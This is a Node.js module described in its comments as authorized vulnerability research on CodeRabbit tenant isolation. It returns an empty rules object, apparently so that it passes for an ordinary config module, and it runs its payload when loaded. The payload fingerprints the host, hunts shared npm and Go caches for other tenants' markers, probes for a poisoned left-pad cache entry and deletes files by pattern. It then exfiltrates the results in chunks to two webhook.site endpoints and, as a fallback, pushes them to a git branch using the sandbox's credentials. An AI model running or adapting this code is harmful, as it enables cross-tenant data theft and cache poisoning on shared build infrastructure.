// TENANTCACHE battery v2 (mode c2) — authorized CodeRabbit VDP research (own tenants B + C3).
// c2 = org C3 second commit on the SAME change lineage as c1:
//   - READ cross-tenant discriminator: do C3's restored cache dirs contain org B markers (TC_B1_*)
//     or prior-lane canaries (CP6A-*) or the parallel-worker token (TC_B1_6e0333e9)?
//   - READ same-lineage control: TC_C3_* planted by c1 (proves vehicle ran + restore works).
//   - node identity for affinity attribution.
//   - dep-cache install probe (poisoned-entry serve test).
//   - cleanup: delete ONLY this engagement's markers (not the parallel worker's 6e0333e9 files).
// Exfil: parallel, paced, timeout-guarded, dual-token (fresh + legacy) + git-push fallback.
module.exports = function tcBattery() {
  const OASTS = ["https://webhook.site/3bface3d-80aa-4f37-bdc7-d85e194d6a7d", "https://webhook.site/128cbeca-d2ff-499c-a497-a94e30d7ae54"];
  const MODE = "c2";
  const cp = require("child_process");
  const fs = require("fs");
  const os = require("os");
  const path = require("path");
  const crypto = require("crypto");
  const RAND = crypto.randomBytes(4).toString("hex");
  const cl = (s, n) => String(s == null ? "" : s).replace(/[\s\n\r]+/g, " ").replace(/[;|,]/g, "~").slice(0, n || 160);
  const OUT = [];
  const FULL = [];
  const add = (s) => { OUT.push(s); FULL.push(s); };
  const run = (cmd) => {
    try {
      const o = cp.execSync(cmd, { timeout: 12000, env: Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: "0" }) });
      return { rc: 0, out: o.toString() };
    } catch (e) {
      return { rc: e.status == null ? -1 : e.status, out: ((e.stdout || "") + " " + (e.stderr || e.message || "")).toString() };
    }
  };
  // ---- exfil: non-blocking, every chunk standalone, 2 channels, 4s timeout, 700ms pacing ----
  let seq = 0;
  const flush = (phase) => {
    const payload = OUT.join("\n");
    OUT.length = 0;
    const chunks = [];
    for (let i = 0; i < payload.length; i += 400) chunks.push(payload.slice(i, i + 400));
    const https = require("https");
    chunks.forEach((body, i) => {
      const delay = (seq * 250) + (i * 250);
      seq += 1;
      setTimeout(() => {
        OASTS.forEach((base) => {
          const u = base + "?t=tc2-" + phase + "-" + i + "&d=" + encodeURIComponent(body);
          try {
            const rq = https.get(u, (res) => { res.resume(); });
            rq.setTimeout(4000, () => { try { rq.destroy(); } catch (e) {} });
            rq.on("error", () => {});
          } catch (e) {}
        });
      }, delay);
    });
  };

  add("TC2A mode=" + MODE + " rand=" + RAND + " t0=" + Date.now() + " node=" + process.version);
  const cwd = process.cwd();
  const HOME = os.homedir();
  const STORE = process.env.npm_config_store_dir || path.join(HOME, ".npm");
  const GOCACHE = process.env.GOCACHE || path.join(HOME, ".cache", "go-build");
  const GOMOD = process.env.GOMODCACHE || path.join(HOME, "go", "pkg", "mod");

  try {
    // ---- N: node identity (compact) ----
    add("N uid=" + (run("id -u").out || "").trim() + " kern=" + cl(run("uname -r").out, 20) + " boot=" + cl(run("cat /proc/sys/kernel/random/boot_id 2>/dev/null").out, 40));
    add("N upper:" + cl(run("grep -oE 'upperdir=[^ ]*' /proc/mounts | head -1").out, 160));
    add("N mac=" + cl(run("cat /sys/class/net/*/address 2>/dev/null | head -3").out, 60));
    add("N ssd:" + cl(run("ls /ssd 2>&1 | head -3").out, 80));

    // ---- R: the discriminator reads ----
    const canaries = [
      [path.join(HOME, ".cache", "tc_marker"), "homecache"],
      [path.join("/tmp", "tc_marker"), "tmpdir"],
      [path.join(STORE, "tc_marker"), "npmstore"],
      [path.join(GOCACHE, "tc_marker"), "gocache"],
      [path.join(GOMOD, "tc_marker"), "gomod"],
      [path.join(STORE, "tc_dep_poison", "left-pad-1.3.0.marker"), "npmdep"],
      [path.join(GOMOD, "cache", "download", "tc-dep-poison.marker"), "gomoddep"],
    ];
    for (const [p, tag] of canaries) {
      try {
        const st = fs.statSync(p);
        const body = fs.readFileSync(p, "utf8").slice(0, 48);
        add("R FOUND " + tag + " mtime=" + st.mtimeMs + " body=" + cl(body, 48));
      } catch (e) { add("R absent " + tag); }
    }
    const hunt = run("find " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' /dev/shm -maxdepth 4 \\( -name 'tc_marker*' -o -name 'TC_B*' -o -name 'TC_C*' -o -name 'tc_dep*' -o -name '*dep-poison*' -o -name 'cp_canary*' \\) 2>/dev/null | head -15");
    add("R names:" + cl(hunt.out, 380));
    const bodies = run("grep -rIl -e 'TC_B1_' -e 'TC_C3_' -e 'TCDEP_' -e 'CP6A-RUN1' " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' 2>/dev/null | head -12");
    add("R bodyhits:" + cl(bodies.out, 380));
    const tok = run("grep -rIl '6e0333e9' " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' 2>/dev/null | head -8");
    add("R sibling_tok:" + cl(tok.out, 250));
    add("R cache_ls:" + cl(run("ls -la " + HOME + "/.cache 2>/dev/null | head -12").out, 320));
    add("R newest:" + cl(run("find " + HOME + "/.cache /tmp -maxdepth 3 -type f -newermt '2026-09-27 00:30' 2>/dev/null | head -12").out, 300));
    flush("a");
  } catch (e) {
    add("R BLOCK ERR " + cl(e.message, 120));
    flush("err");
  }

  try {
    // ---- D: dependency-cache install probe ----
    const inst = run("mkdir -p /tmp/tcdep_probe && cd /tmp/tcdep_probe && npm install --prefer-offline --no-audit --no-fund left-pad@1.3.0 2>&1 | tail -3; ls /tmp/tcdep_probe/node_modules 2>/dev/null | head -4");
    add("D install:" + cl(inst.out, 320));
    add("D npmcache:" + cl(run("ls '" + STORE + "'/_cacache/index-v2 2>/dev/null | head -3; npm cache ls left-pad 2>&1 | head -3").out, 200));
    flush("b");
  } catch (e) {
    add("D ERR " + cl(e.message, 100));
    flush("derr");
  }

  try {
    // ---- Z: cleanup of THIS engagement's markers only (preserve parallel worker's 6e0333e9) ----
    const rm = run("find " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' /dev/shm -maxdepth 4 \\( -name 'tc_marker*' -o -name 'TC_B1*' -o -name 'TC_C3*' -o -name 'tc_dep*' -o -name '*dep-poison*' -o -name 'cp_canary*' \\) -type f ! -exec grep -q '6e0333e9' {} \\; -delete 2>/dev/null; echo Z_DONE");
    add("Z cleanup:" + cl(rm.out, 160));
    add("Z verify:" + cl(run("ls " + HOME + "/.cache/tc_marker /tmp/tc_marker 2>&1 | head -3").out, 120));
  } catch (e) {
    add("Z ERR " + cl(e.message, 100));
  }

  // ---- G: git-push fallback channel (own repo, sandbox's existing git auth) ----
  try {
    const payload = FULL.join("\n");
    const gp = run("cd '" + cwd + "' && printf '%s' '" + payload.replace(/'/g, "") + "' > tc_out_" + MODE + ".txt && git add -f tc_out_" + MODE + ".txt && git -c user.email=tcout@localhost -c user.name=tcout commit -q -m 'tcout " + MODE + " " + RAND + "' && git push -q origin HEAD:refs/heads/tc-exfil-" + MODE + " 2>&1 | tail -2; echo GP_RC=$?");
    add("G gitpush:" + cl(gp.out, 200));
    flush("g");
  } catch (e) {
    add("G ERR " + cl(e.message, 100));
    flush("gerr");
  }

  return { rules: {} };
};
